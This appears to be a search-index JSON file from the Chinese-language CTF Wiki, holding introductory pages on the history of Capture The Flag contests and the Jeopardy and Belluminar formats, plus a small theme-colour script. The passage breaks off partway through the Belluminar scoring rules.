{
    "docs": [
        {
            "location": "/", 
            "text": "\u6b22\u8fce\u6765\u5230 \nCTF Wiki\n\n\nCTF\n\uff0c\u5168\u79f0 Capture The Flag\uff0c\u5373\u593a\u65d7\u8d5b\uff0c\u8d77\u6e90\u4e8e 1996 \u5e74 DEFCON \u5168\u7403\u9ed1\u5ba2\u5927\u4f1a\uff0c\u662f\u7f51\u7edc\u5b89\u5168\u6280\u672f\u4eba\u5458\u8fdb\u884c\u6280\u672f\u7ade\u6280\u7684\u4e00\u79cd\u6bd4\u8d5b\u3002\n\n\nCTF Wiki\n \u662f\u4e00\u4e2a\u514d\u8d39\u5f00\u653e\u4e14\u6301\u7eed\u66f4\u65b0\u7684\u77e5\u8bc6\u6574\u5408\u7ad9\u70b9\uff0c\u4f60\u53ef\u4ee5\u5728\u8fd9\u91cc\u5b66\u5230\u5173\u4e8e CTF \u7ade\u8d5b\u53ca\u7f51\u7edc\u5b89\u5168\u76f8\u5173\u7684\u6709\u8da3\u77e5\u8bc6\uff0c\u6211\u4eec\u4e3a\u4f60\u51c6\u5907\u4e86 CTF \u7ade\u8d5b\u4e2d\u7684\u57fa\u7840\u77e5\u8bc6\u3001\u5e38\u89c1\u9898\u578b\u3001\u89e3\u9898\u601d\u8def\u4ee5\u53ca\u5e38\u7528\u5de5\u5177\u7b49\uff0c\u5e2e\u52a9\u4f60\u66f4\u5feb\u901f\u5730\u4e86\u89e3 CTF \u7ade\u8d5b\u4ee5\u53ca\u7f51\u7edc\u5b89\u5168\u3002\n\n\n\u6587\u6863\u5185\u5bb9\u6258\u7ba1\u5728 \nGithub\n\uff0c\u671f\u5f85\u4f60\u7684\u52a0\u5165\u3002\n\n\nMaterial color palette \u989c\u8272\u4e3b\u9898\n\n\nPrimary colors \u4e3b\u8272\n\n\n\n\n\u9ed8\u8ba4 \nwhite\n\n\n\n\n\u70b9\u51fb\u8272\u5757\u53ef\u66f4\u6362\u4e3b\u9898\u7684\u4e3b\u8272\n\n\nRed\n\n\nPink\n\n\nPurple\n\n\nDeep Purple\n\n\nIndigo\n\n\nBlue\n\n\nLight Blue\n\n\nCyan\n\n\nTeal\n\n\nGreen\n\n\nLight Green\n\n\nLime\n\n\nYellow\n\n\nAmber\n\n\nOrange\n\n\nDeep Orange\n\n\nBrown\n\n\nGrey\n\n\nBlue Grey\n\n\nWhite\n\n\n\n  var buttons = document.querySelectorAll(\"button[data-md-color-primary]\");\n  Array.prototype.forEach.call(buttons, function(button) {\n    button.addEventListener(\"click\", function() {\n      document.body.dataset.mdColorPrimary = this.dataset.mdColorPrimary;\n      localStorage.setItem(\"data-md-color-primary\",this.dataset.mdColorPrimary);\n    })\n  })\n\n\n\n\nAccent colors \u8f85\u52a9\u8272\n\n\n\n\n\u9ed8\u8ba4 \nred\n\n\n\n\n\u70b9\u51fb\u8272\u5757\u66f4\u6362\u4e3b\u9898\u7684\u8f85\u52a9\u8272\n\n\nRed\n\n\nPink\n\n\nPurple\n\n\nDeep Purple\n\n\nIndigo\n\n\nBlue\n\n\nLight Blue\n\n\nCyan\n\n\nTeal\n\n\nGreen\n\n\nLight Green\n\n\nLime\n\n\nYellow\n\n\nAmber\n\n\nOrange\n\n\nDeep Orange\n\n\n\n  var buttons = document.querySelectorAll(\"button[data-md-color-accent]\");\n  Array.prototype.forEach.call(buttons, function(button) {\n    button.addEventListener(\"click\", function() {\n      document.body.dataset.mdColorAccent = this.dataset.mdColorAccent;\n      localStorage.setItem(\"data-md-color-accent\",this.dataset.mdColorAccent);\n    })\n  })", 
            "title": "Getting Started"
        }, 
        {
            "location": "/#ctf-wiki", 
            "text": "CTF \uff0c\u5168\u79f0 Capture The Flag\uff0c\u5373\u593a\u65d7\u8d5b\uff0c\u8d77\u6e90\u4e8e 1996 \u5e74 DEFCON \u5168\u7403\u9ed1\u5ba2\u5927\u4f1a\uff0c\u662f\u7f51\u7edc\u5b89\u5168\u6280\u672f\u4eba\u5458\u8fdb\u884c\u6280\u672f\u7ade\u6280\u7684\u4e00\u79cd\u6bd4\u8d5b\u3002  CTF Wiki  \u662f\u4e00\u4e2a\u514d\u8d39\u5f00\u653e\u4e14\u6301\u7eed\u66f4\u65b0\u7684\u77e5\u8bc6\u6574\u5408\u7ad9\u70b9\uff0c\u4f60\u53ef\u4ee5\u5728\u8fd9\u91cc\u5b66\u5230\u5173\u4e8e CTF \u7ade\u8d5b\u53ca\u7f51\u7edc\u5b89\u5168\u76f8\u5173\u7684\u6709\u8da3\u77e5\u8bc6\uff0c\u6211\u4eec\u4e3a\u4f60\u51c6\u5907\u4e86 CTF \u7ade\u8d5b\u4e2d\u7684\u57fa\u7840\u77e5\u8bc6\u3001\u5e38\u89c1\u9898\u578b\u3001\u89e3\u9898\u601d\u8def\u4ee5\u53ca\u5e38\u7528\u5de5\u5177\u7b49\uff0c\u5e2e\u52a9\u4f60\u66f4\u5feb\u901f\u5730\u4e86\u89e3 CTF \u7ade\u8d5b\u4ee5\u53ca\u7f51\u7edc\u5b89\u5168\u3002  \u6587\u6863\u5185\u5bb9\u6258\u7ba1\u5728  Github \uff0c\u671f\u5f85\u4f60\u7684\u52a0\u5165\u3002", 
            "title": "\u6b22\u8fce\u6765\u5230 CTF Wiki"
        }, 
        {
            "location": "/#material-color-palette", 
            "text": "", 
            "title": "Material color palette \u989c\u8272\u4e3b\u9898"
        }, 
        {
            "location": "/#primary-colors", 
            "text": "\u9ed8\u8ba4  white   \u70b9\u51fb\u8272\u5757\u53ef\u66f4\u6362\u4e3b\u9898\u7684\u4e3b\u8272  Red  Pink  Purple  Deep Purple  Indigo  Blue  Light Blue  Cyan  Teal  Green  Light Green  Lime  Yellow  Amber  Orange  Deep Orange  Brown  Grey  Blue Grey  White  \n  var buttons = document.querySelectorAll(\"button[data-md-color-primary]\");\n  Array.prototype.forEach.call(buttons, function(button) {\n    button.addEventListener(\"click\", function() {\n      document.body.dataset.mdColorPrimary = this.dataset.mdColorPrimary;\n      localStorage.setItem(\"data-md-color-primary\",this.dataset.mdColorPrimary);\n    })\n  })", 
            "title": "Primary colors \u4e3b\u8272"
        }, 
        {
            "location": "/#accent-colors", 
            "text": "\u9ed8\u8ba4  red   \u70b9\u51fb\u8272\u5757\u66f4\u6362\u4e3b\u9898\u7684\u8f85\u52a9\u8272  Red  Pink  Purple  Deep Purple  Indigo  Blue  Light Blue  Cyan  Teal  Green  Light Green  Lime  Yellow  Amber  Orange  Deep Orange  \n  var buttons = document.querySelectorAll(\"button[data-md-color-accent]\");\n  Array.prototype.forEach.call(buttons, function(button) {\n    button.addEventListener(\"click\", function() {\n      document.body.dataset.mdColorAccent = this.dataset.mdColorAccent;\n      localStorage.setItem(\"data-md-color-accent\",this.dataset.mdColorAccent);\n    })\n  })", 
            "title": "Accent colors \u8f85\u52a9\u8272"
        }, 
        {
            "location": "/introduction/history/", 
            "text": "\u672c\u680f\u5185\u5bb9\u6458\u81ea\u8bf8\u845b\u5efa\u4f1f\u8001\u5e08\u5728 i \u6625\u79cb\u4e0a\u7684\u516c\u5f00\u89c6\u9891\u300cCTF \u7684\u8fc7\u53bb\u3001\u73b0\u5728\u4e0e\u672a\u6765\u300d\u3002\n\n\n\n\nCTF \u7684\u8d77\u6e90\n\n\nCTF \u7684\u524d\u8eab\u662f\u4f20\u7edf\u9ed1\u5ba2\u4e4b\u95f4\u7f51\u7edc\u6280\u672f\u6bd4\u62fc\u7684\u6e38\u620f\uff0c\u8d77\u6e90\u4e8e 1996 \u5e74\u7b2c\u56db\u5c4a DEFCON\u3002\n\n\n\u65e9\u671f CTF \u7ade\u8d5b\n\n\n\u6700\u5f00\u59cb\u7684 CTF \u6bd4\u8d5b\uff081996 \u5e74-2001\n\u5e74\uff09\uff0c\u6ca1\u6709\u660e\u786e\u7684\u6bd4\u8d5b\u89c4\u5219\uff0c\u6ca1\u6709\u4e13\u4e1a\u642d\u5efa\u7684\u6bd4\u8d5b\u5e73\u53f0\u4e0e\u73af\u5883\u3002\u7531\u53c2\u6570\u961f\u4f0d\u5404\u81ea\u51c6\u5907\u6bd4\u8d5b\u76ee\u6807\uff08\u81ea\u5df1\u51c6\u5907\u7684\u6bd4\u8d5b\u76ee\u6807\u81ea\u5df1\u9632\u5b88\u5e76\u8981\u5c1d\u8bd5\u653b\u7834\u5bf9\u65b9\u63d0\u4f9b\u7684\u6bd4\u8d5b\u76ee\u6807\uff09\u3002\u800c\u7ec4\u7ec7\u8005\u5927\u90fd\u53ea\u662f\u4e00\u4e9b\u975e\u4e13\u4e1a\u7684\u5fd7\u613f\u8005\uff0c\u63a5\u53d7\u53c2\u8d5b\u961f\u4f0d\u8bf7\u6c42\u624b\u5de5\u8ba1\u5206\u3002\n\n\n\u6ca1\u6709\u540e\u53f0\u81ea\u52a8\u7cfb\u7edf\u652f\u6301\u548c\u88c1\u5224\u6280\u672f\u80fd\u529b\u8ba4\u5b9a\uff0c\u8ba1\u5206\u5ef6\u8fdf\u548c\u8bef\u5dee\u4ee5\u53ca\u4e0d\u53ef\u9760\u7684\u7f51\u7edc\u548c\u4e0d\u5f53\u7684\u914d\u7f6e\uff0c\u5bfc\u81f4\u6bd4\u8d5b\u5e26\u6765\u4e86\u6781\u5927\u7684\u4e89\u8bba\u4e0e\u4e0d\u6ee1\u3002\n\n\n\u300c\u73b0\u4ee3\u300dCTF \u7ade\u8d5b\n\n\n\u7531\u4e13\u4e1a\u961f\u4f0d\u627f\u62c5\u6bd4\u8d5b\u5e73\u53f0\u3001\u547d\u9898\u3001\u8d5b\u4e8b\u7ec4\u7ec7\u4ee5\u53ca\u81ea\u52a8\u5316\u79ef\u5206\u7cfb\u7edf\u3002\u53c2\u8d5b\u961f\u4f0d\u9700\u63d0\u4ea4\u53c2\u8d5b\u7533\u8bf7\uff0c\u7531 DEFCON \u4f1a\u8bae\u7ec4\u7ec7\u8005\u4eec\u8fdb\u884c\u8bc4\u9009\u3002\n\n\n\u5c31 LegitBS \u7ec4\u7ec7\u7684\u4e09\u5e74 DEFCON CTF \u6bd4\u8d5b\u800c\u8a00\uff0c\u6709\u4ee5\u4e0b\u7a81\u51fa\u7279\u70b9\uff1a\n\n\n\n\n\u6bd4\u8d5b\u4fa7\u91cd\u4e8e\u5bf9\u8ba1\u7b97\u673a\u5e95\u5c42\u548c\u7cfb\u7edf\u5b89\u5168\u6838\u5fc3\u80fd\u529b\uff0cWeb \u6f0f\u6d1e\u653b\u9632\u6280\u5de7\u5b8c\u5168\u4e0d\u53d7\u91cd\u89c6\u3002\n\n\n\u7ade\u8d5b\u73af\u5883\u8d8b\u5411\u591a CPU \u6307\u4ee4\u67b6\u6784\u96c6\uff0c\u591a\u64cd\u4f5c\u7cfb\u7edf\uff0c\u591a\u7f16\u7a0b\u8bed\u8a00\u3002\n\n\n\u91c7\u7528\u300c\u96f6\u548c\u300d\u8ba1\u5206\u89c4\u5219\u3002\n\n\n\u56e2\u961f\u7efc\u5408\u80fd\u529b\u8003\u7814\uff1a\u9006\u5411\u5206\u6790\u3001\u6f0f\u6d1e\u6316\u6398\u3001\u6f0f\u6d1e\u5229\u7528\u3001\u6f0f\u6d1e\u4fee\u8865\u52a0\u56fa\u3001\u7f51\u7edc\u6d41\u91cf\u5206\u6790\u3001\u7cfb\u7edf\u5b89\u5168\u8fd0\u7ef4\u4ee5\u53ca\u9762\u5411\u5b89\u5168\u7684\u7f16\u7a0b\u8c03\u8bd5\u3002", 
            "title": "CTF \u5386\u53f2"
        }, 
        {
            "location": "/introduction/history/#ctf", 
            "text": "CTF \u7684\u524d\u8eab\u662f\u4f20\u7edf\u9ed1\u5ba2\u4e4b\u95f4\u7f51\u7edc\u6280\u672f\u6bd4\u62fc\u7684\u6e38\u620f\uff0c\u8d77\u6e90\u4e8e 1996 \u5e74\u7b2c\u56db\u5c4a DEFCON\u3002", 
            "title": "CTF \u7684\u8d77\u6e90"
        }, 
        {
            "location": "/introduction/history/#ctf_1", 
            "text": "\u6700\u5f00\u59cb\u7684 CTF \u6bd4\u8d5b\uff081996 \u5e74-2001\n\u5e74\uff09\uff0c\u6ca1\u6709\u660e\u786e\u7684\u6bd4\u8d5b\u89c4\u5219\uff0c\u6ca1\u6709\u4e13\u4e1a\u642d\u5efa\u7684\u6bd4\u8d5b\u5e73\u53f0\u4e0e\u73af\u5883\u3002\u7531\u53c2\u6570\u961f\u4f0d\u5404\u81ea\u51c6\u5907\u6bd4\u8d5b\u76ee\u6807\uff08\u81ea\u5df1\u51c6\u5907\u7684\u6bd4\u8d5b\u76ee\u6807\u81ea\u5df1\u9632\u5b88\u5e76\u8981\u5c1d\u8bd5\u653b\u7834\u5bf9\u65b9\u63d0\u4f9b\u7684\u6bd4\u8d5b\u76ee\u6807\uff09\u3002\u800c\u7ec4\u7ec7\u8005\u5927\u90fd\u53ea\u662f\u4e00\u4e9b\u975e\u4e13\u4e1a\u7684\u5fd7\u613f\u8005\uff0c\u63a5\u53d7\u53c2\u8d5b\u961f\u4f0d\u8bf7\u6c42\u624b\u5de5\u8ba1\u5206\u3002  \u6ca1\u6709\u540e\u53f0\u81ea\u52a8\u7cfb\u7edf\u652f\u6301\u548c\u88c1\u5224\u6280\u672f\u80fd\u529b\u8ba4\u5b9a\uff0c\u8ba1\u5206\u5ef6\u8fdf\u548c\u8bef\u5dee\u4ee5\u53ca\u4e0d\u53ef\u9760\u7684\u7f51\u7edc\u548c\u4e0d\u5f53\u7684\u914d\u7f6e\uff0c\u5bfc\u81f4\u6bd4\u8d5b\u5e26\u6765\u4e86\u6781\u5927\u7684\u4e89\u8bba\u4e0e\u4e0d\u6ee1\u3002", 
            "title": "\u65e9\u671f CTF \u7ade\u8d5b"
        }, 
        {
            "location": "/introduction/history/#ctf_2", 
            "text": "\u7531\u4e13\u4e1a\u961f\u4f0d\u627f\u62c5\u6bd4\u8d5b\u5e73\u53f0\u3001\u547d\u9898\u3001\u8d5b\u4e8b\u7ec4\u7ec7\u4ee5\u53ca\u81ea\u52a8\u5316\u79ef\u5206\u7cfb\u7edf\u3002\u53c2\u8d5b\u961f\u4f0d\u9700\u63d0\u4ea4\u53c2\u8d5b\u7533\u8bf7\uff0c\u7531 DEFCON \u4f1a\u8bae\u7ec4\u7ec7\u8005\u4eec\u8fdb\u884c\u8bc4\u9009\u3002  \u5c31 LegitBS \u7ec4\u7ec7\u7684\u4e09\u5e74 DEFCON CTF \u6bd4\u8d5b\u800c\u8a00\uff0c\u6709\u4ee5\u4e0b\u7a81\u51fa\u7279\u70b9\uff1a   \u6bd4\u8d5b\u4fa7\u91cd\u4e8e\u5bf9\u8ba1\u7b97\u673a\u5e95\u5c42\u548c\u7cfb\u7edf\u5b89\u5168\u6838\u5fc3\u80fd\u529b\uff0cWeb \u6f0f\u6d1e\u653b\u9632\u6280\u5de7\u5b8c\u5168\u4e0d\u53d7\u91cd\u89c6\u3002  \u7ade\u8d5b\u73af\u5883\u8d8b\u5411\u591a CPU \u6307\u4ee4\u67b6\u6784\u96c6\uff0c\u591a\u64cd\u4f5c\u7cfb\u7edf\uff0c\u591a\u7f16\u7a0b\u8bed\u8a00\u3002  \u91c7\u7528\u300c\u96f6\u548c\u300d\u8ba1\u5206\u89c4\u5219\u3002  \u56e2\u961f\u7efc\u5408\u80fd\u529b\u8003\u7814\uff1a\u9006\u5411\u5206\u6790\u3001\u6f0f\u6d1e\u6316\u6398\u3001\u6f0f\u6d1e\u5229\u7528\u3001\u6f0f\u6d1e\u4fee\u8865\u52a0\u56fa\u3001\u7f51\u7edc\u6d41\u91cf\u5206\u6790\u3001\u7cfb\u7edf\u5b89\u5168\u8fd0\u7ef4\u4ee5\u53ca\u9762\u5411\u5b89\u5168\u7684\u7f16\u7a0b\u8c03\u8bd5\u3002", 
            "title": "\u300c\u73b0\u4ee3\u300dCTF \u7ade\u8d5b"
        }, 
        {
            "location": "/introduction/mode/", 
            "text": "\u89e3\u9898\u6a21\u5f0f - Jeopardy\n\n\n\u89e3\u9898\u6a21\u5f0f\uff08Jeopardy\uff09\u5e38\u89c1\u4e8e\u7ebf\u4e0a\u9009\u62d4\u6bd4\u8d5b\u3002\u5728\u89e3\u9898\u6a21\u5f0f CTF \u8d5b\u5236\u4e2d\uff0c\u53c2\u8d5b\u961f\u4f0d\u53ef\u4ee5\u901a\u8fc7\u4e92\u8054\u7f51\u6216\u8005\u73b0\u573a\u7f51\u7edc\u53c2\u4e0e\uff0c\u53c2\u6570\u961f\u4f0d\u901a\u8fc7\u4e0e\u5728\u7ebf\u73af\u5883\u4ea4\u4e92\u6216\u6587\u4ef6\u79bb\u7ebf\u5206\u6790\uff0c\u89e3\u51b3\u7f51\u7edc\u5b89\u5168\u6280\u672f\u6311\u6218\u83b7\u53d6\u76f8\u5e94\u5206\u503c\uff0c\u4e0e ACM\n\u7f16\u7a0b\u7ade\u8d5b\u3001\u4fe1\u606f\u5b66\u5965\u8d5b\u6bd4\u8f83\u7c7b\u4f3c\uff0c\u6839\u636e\u603b\u5206\u548c\u65f6\u95f4\u6765\u6392\u540d\u3002\n\n\n\u76f8\u4e0d\u540c\u7684\u662f\u89e3\u9898\u6a21\u5f0f\u4e00\u822c\u4f1a\u8bbe\u7f6e \n\u4e00\u8840\n \u3001 \n\u4e8c\u8840\n \u3001 \n\u4e09\u8840\n \uff0c\u4e5f\u5373\u6700\u5148\u5b8c\u6210\u7684\u524d\u4e09\u652f\u961f\u4f0d\u4f1a\u83b7\u5f97\u989d\u5916\u5206\u503c\uff0c\u6240\u4ee5\u8fd9\u4e0d\u4ec5\u662f\u5bf9\u9996\u5148\u89e3\u51fa\u9898\u76ee\u7684\u961f\u4f0d\u7684\u5206\u503c\u9f13\u52b1\uff0c\u4e5f\u662f\u4e00\u79cd\u56e2\u961f\u80fd\u529b\u7684\u95f4\u63a5\u4f53\u73b0\u3002\n\n\n\u5f53\u7136\u8fd8\u6709\u4e00\u79cd\u6d41\u884c\u7684\u8ba1\u5206\u89c4\u5219\u662f\u8bbe\u7f6e\u6bcf\u9053\u9898\u76ee\u7684\u521d\u59cb\u5206\u6570\u540e\uff0c\u6839\u636e\u8be5\u9898\u7684\u6210\u529f\u89e3\u7b54\u961f\u4f0d\u6570\uff0c\u6765\u9010\u6e10\u964d\u4f4e\u8be5\u9898\u7684\u5206\u503c\uff0c\u4e5f\u5c31\u662f\u8bf4\u5982\u679c\u89e3\u7b54\u8fd9\u9053\u9898\u7684\u4eba\u6570\u8d8a\u591a\uff0c\u90a3\u4e48\u8fd9\u9053\u9898\u7684\u5206\u503c\u5c31\u8d8a\u4f4e\u3002\u6700\u540e\u4f1a\u4e0b\u964d\u5230\u4e00\u4e2a\u4fdd\u5e95\u5206\u503c\u540e\u4fbf\u4e0d\u518d\u4e0b\u964d\u3002\n\n\n\u9898\u76ee\u7c7b\u578b\u4e3b\u8981\u5305\u542b \nWeb \u7f51\u7edc\u653b\u9632\n \u3001 \nRE \u9006\u5411\u5de5\u7a0b\n \u3001 \nPwn \u4e8c\u8fdb\u5236\u6f0f\u6d1e\u5229\u7528\n \u3001 \nCrypto \u5bc6\u7801\u653b\u51fb\n \u3001 \nMobile \u79fb\u52a8\u5b89\u5168\n \u4ee5\u53ca \nMisc \u5b89\u5168\u6742\u9879\n \u8fd9\u516d\u4e2a\u7c7b\u522b\u3002\n\n\n\u6218\u4e89\u5206\u4eab\u6a21\u5f0f - Belluminar\n\n\n\u5728 2016 \u5e74\u4e16\u754c\u9ed1\u5ba2\u5927\u5e08\u6311\u6218\u8d5b\uff08WCTF\uff09\u56fd\u5185\u9996\u6b21\u5f15\u5165\u97e9\u56fd POC SECURITY \u56e2\u961f\u5f00\u521b\u7684 BELLUMINAR CTF \uff08\u6218\u4e89\u4e0e\u5206\u4eab\uff09\u8d5b\u5236\uff0c\u4ece\u6b64\u56fd\u5185\u9646\u9646\u7eed\u7eed\u4e5f\u6709\u5f00\u59cb BELLUMINAR \u6a21\u5f0f\u7684\u6bd4\u8d5b\uff0c\u76ee\u524d\u91c7\u53d6\u8fd9\u4e00\u8d5b\u5236\u7684\u6709 2016\n\u5e74\u8bf8\u845b\u5efa\u4f1f\u8001\u5e08\u96c6\u5408\u7684 XMan \u590f\u4ee4\u8425\u5206\u4eab\u8d5b\u4ee5\u53ca\u540c\u5e74 9 \u6708\u7684\u300c\u767e\u5ea6\u676f\u300dCTF \u6bd4\u8d5b\u3002\n\n\n\u540c\u65f6\u8fd9\u91cc\u4e5f\u6709 BELLUMINAR \u8d5b\u5236\u7684\u4ecb\u7ecd\u5b98\u7f51\uff1a \nhttp://belluminar.org/\n\n\n\u8d5b\u5236\u4ecb\u7ecd\n\n\n\n\nBelluminar, hacking contest of POC, started at POC2015 in KOREA for the first time. Belluminar is from 'Bellum'(war in Latin) and 'seminar'. It is not a just hacking contest but a kind of\nfestival consisted of CTF \n seminar for the solution about challenges. Only invited teams can join Belluminar. Each team can show its ability to attack what other teams want to protect and can\ndefend what others want to attack.\n\n\n\n\n\u5982\u5b98\u7f51\u4ecb\u7ecd\u8fd9\u6837\uff0cBELLUMINAR CTF \u8d5b\u5236\u7531\u53d7\u9080\u53c2\u8d5b\u961f\u4f0d\u76f8\u4e92\u51fa\u9898\u6311\u6218\uff0c\u5e76\u5728\u6bd4\u8d5b\u7ed3\u675f\u540e\u8fdb\u884c\u8d5b\u9898\u7684\u51fa\u9898\u601d\u8def\uff0c\u5b66\u4e60\u8fc7\u7a0b\u4ee5\u53ca\u89e3\u9898\u601d\u8def\u7b49\u8fdb\u884c\u5206\u4eab\u3002\u6218\u961f\u8bc4\u5206\u4f9d\u636e\u51fa\u9898\u5f97\u5206\uff0c\u89e3\u9898\u5f97\u5206\u548c\u5206\u4eab\u5f97\u5206\u8fdb\u884c\u7efc\u5408\u8bc4\u4ef7\u5e76\u5f97\u51fa\u6700\u7ec8\u7684\u6392\u540d\u3002\n\n\n\u51fa\u9898\u9636\u6bb5\n\n\n\n\nEach team is required to submit 2 challenges to the challenge bank of the sponsor.\n\n\n\n\n\u9996\u5148\u5404\u4e2a\u53d7\u9080\u53c2\u8d5b\u961f\u4f0d\u90fd\u5fc5\u987b\u5728\u6b63\u5f0f\u6bd4\u8d5b\u524d\u51fa\u9898\uff0c\u9898\u91cf\u4e3a 2 \u9053\u3002\u53c2\u8d5b\u961f\u4f0d\u5c06\u6709 12 \u5468\u7684\u65f6\u95f4\u51c6\u5907\u9898\u76ee\u3002\u51fa\u9898\u79ef\u5206\u5360\u603b\u5206\u7684 30%\u3002\n\n\n\n\nChallenge 1: must be on the Linux platform;\n\n\nChallenge 2: No platform restriction(except Linux) No challenge type restriction (Pwn, Reverse...)\n\n\n\n\n\u4f20\u7edf\u7684 BELLUMINAR \u8d5b\u5236\u8981\u6c42\u51fa\u7684\u4e24\u9053\u9898\u4e2d\u4e00\u9053 Challenge \u5fc5\u987b\u662f\u5728 Linux \u5e73\u53f0\uff0c\u53e6\u5916\u4e00\u4e2a\u5219\u4e3a\u975e Linux \u5e73\u53f0\u7684 Challenge\u3002\u4e24\u4e2a Challenge \u7684\u7c7b\u578b\u5219\u6ca1\u6709\u505a\u51fa\u9650\u5236\u3002\u56e0\u6b64\u961f\u4f0d\u53ef\u4ee5\u5c3d\u60c5\u5c55\u73b0\u81ea\u5df1\u7684\u6280\u672f\u6c34\u5e73\u3002\n\n\n\u4e3a\u4f7f\u6bd4\u8d5b\u9898\u76ee\u7c7b\u578b\u6bd4\u8f83\u5747\u8861\uff0c\u4e5f\u6709\u91c7\u7528\u961f\u4f0d\u62bd\u7b7e\u51fa\u9898\u7684\u65b9\u5f0f\u62bd\u53d6\u81ea\u5df1\u7684\u9898\uff0c\u8fd9\u8981\u6c42\u961f\u4f0d\u80fd\u529b\u6c34\u5e73\u66f4\u4e3a\u5168\u9762\uff0c\u56e0\u6b64\u4e3a\u4e86\u4e0d\u5931\u5e73\u8861\u6027\uff0c\u4e5f\u4f1a\u5c06\u4e24\u9053 Challenge \u7684\u8ba1\u5165\u4e0d\u540c\u5206\u503c\uff08\u6bd4\u5982\u8981\u6c42\u5176\u4e2d\u4e00\u9053 Challenge \u5206\u503c\u4e3a\n200\uff0c\u800c\u53e6\u5916\u4e00\u9053\u5206\u503c\u5219\u4e3a 100\uff09\u3002\n\n\n\u63d0\u4ea4\u90e8\u7f72\n\n\n\u9898\u76ee\u63d0\u4ea4\u622a\u6b62\u4e4b\u524d\uff0c\u5404\u4e2a\u961f\u4f0d\u9700\u8981\u63d0\u4ea4\u5b8c\u6574\u7684\u51fa\u9898\u6587\u6863\u4ee5\u53ca\u89e3\u9898 Writeup\uff0c\u8981\u6c42\u51fa\u9898\u6587\u6863\u4e2d\u8be6\u7ec6\u6807\u660e\u9898\u76ee\u5206\u503c\uff0c\u9898\u9762\uff0c\u51fa\u9898\u8d1f\u8d23\u4eba\uff0c\u8003\u5bdf\u77e5\u8bc6\u70b9\u5217\u8868\u4ee5\u53ca\u9898\u76ee\u6e90\u7801\u3002\u800c\u89e3\u9898 Writeup\n\u4e2d\u5219\u9700\u8981\u5305\u542b\u64cd\u4f5c\u73af\u5883\uff0c\u5b8c\u6574\u89e3\u9898\u8fc7\u7a0b\uff0c\u89e3\u9898\u4ee3\u7801\u3002\n\n\n\u9898\u76ee\u63d0\u4ea4\u4e4b\u540e\u4e3b\u529e\u65b9\u4f1a\u5bf9\u9898\u76ee\u548c\u89e3\u9898\u4ee3\u7801\u8fdb\u884c\u6d4b\u8bd5\uff0c\u671f\u95f4\u51fa\u73b0\u95ee\u9898\u5219\u9700\u8981\u8be5\u9898\u8d1f\u8d23\u4eba\u914d\u5408\u89e3\u51b3\u3002\u6700\u7ec8\u90e8\u7f72\u5230\u6bd4\u8d5b\u5e73\u53f0\u4e0a\u3002\n\n\n\u89e3\u9898\u7ade\u6280\n\n\n\u8fdb\u5165\u6bd4\u8d5b\u540e\uff0c\u5404\u652f\u961f\u4f0d\u53ef\u4ee5\u770b\u5230\u6240\u6709\u5176\u4ed6\u56e2\u961f\u51fa\u7684\u9898\u76ee\u5e76\u53d1\u8d77\u6311\u6218\uff0c\u4f46\u662f\u4e0d\u80fd\u89e3\u7b54\u672c\u961f\u51fa\u7684\u9898\u76ee\uff0c\u4e0d\u8bbe\u7f6e First Blood \u5956\u52b1\uff0c\u6839\u636e\u89e3\u9898\u79ef\u5206\u8fdb\u884c\u6392\u540d\u3002\u89e3\u9898\u79ef\u5206\u5360\u603b\u5206\u7684 60%\u3002\n\n\n\u5206\u4eab\u8ba8\u8bba\n\n\n\u6bd4\u8d5b\u7ed3\u675f\u540e\uff0c\u961f\u4f0d\u4f11\u606f\uff0c\u5e76\u51c6\u5907\u5236\u4f5c\u5206\u4eab PPT\uff08\u4e5f\u53ef\u4ee5\u5728\u51fa\u9898\u9636\u6bb5\u51c6\u5907\u597d\uff09\u3002\u5206\u4eab\u4f1a\u65f6\uff0c\u5404\u961f\u6d3e 2\n\u540d\u961f\u5458\u4e0a\u53f0\u8fdb\u884c\u51fa\u9898\u89e3\u9898\u601d\u8def\uff0c\u5b66\u4e60\u8fc7\u7a0b\u4ee5\u53ca\u8003\u5bdf\u77e5\u8bc6\u70b9\u7b49\u7684\u5206\u4eab\u3002\u5728\u6f14\u793a\u7ed3\u675f\u540e\u8fdb\u5165\u4e92\u52a8\u8ba8\u8bba\u73af\u8282\uff0c\u89e3\u8bf4\u4ee3\u8868\u9700\u8981\u56de\u7b54\u8bc4\u59d4\u548c\u5176\u4ed6\u9009\u624b\u63d0\u51fa\u7684\u95ee\u9898\u3002\u89e3\u8bf4\u6ca1\u6709\u592a\u5927\u7684\u65f6\u95f4\u9650\u5236\uff0c\u4f46\u662f\u65f6\u95f4\u7528\u91cf\u662f\u8bc4\u5206\u7684\u4e00\u4e2a\u6807\u51c6\u3002\n\n\n\u8ba1\u5206\u89c4\u5219\n\n\n\u51fa\u9898\u79ef\u5206\uff08\u5360\u603b\u5206 30%\uff09\u6709 50% \u7531\u8bc4\u59d4\u6839\u636e\u9898\u76ee\u63d0\u4ea4\u7684\u8be6\u7ec6\u7a0b\u5ea6\uff0c\u5b8c\u6574\u8d28\u91cf\uff0c\u63d0\u4ea4\u65f6\u95f4\u7b49\u8fdb\u8bc4\u5206\uff0c\u53e6\u5916 50% \u5219\u6839\u636e\u6bd4\u8d5b\u7ed3\u675f\u540e\u6700\u7ec8\u89e3\u9898\u60c5\u51b5\u8fdb\u884c\u8bc4\u5206\u3002\u8ba1\u5206\u516c\u5f0f\u793a\u4f8b\uff1aScore = MaxScore -- | N -- Expect\uff3fN |\u3002\u8fd9\u91cc N\n\u662f\u6307\u89e3\u51fa\u8be5\u9898\u7684\u961f\u4f0d\u6570\u91cf\uff0c\u800c Expect\uff3fN \u5219\u662f\u8fd9\u9053\u9898\u9884\u671f\u5e94\u8be5\u89e3\u51fa\u7684\u9898\u76ee\u6570\u91cf\u3002\u53ea\u6709\u5f53\u9898\u76ee\u96be\u5ea6\u9002\u4e2d\uff0c\u89e3\u9898\u961f\u4f0d\u6570\u91cf\u8d8a\u63a5\u8fd1\u9884\u671f\u6570\u91cf Expect\uff3fN\uff0c\u5219\u8fd9\u9053\u9898\u7684\u51fa\u9898\u961f\u4f0d\u5f97\u5230\u7684\u51fa\u9898\u79ef\u5206\u8d8a\u9ad8\u3002\n\n\n\u89e3\u9898\u79ef\u5206\uff08\u5360\u603b\u79ef\u5206 60%\uff09\u5728\u8ba1\u7b97\u65f6\u4e0d\u8003\u8651 First Blood \u5956\u52b1\u3002\n\n\n\u5206\u4eab\u79ef\u5206\uff08\u5360 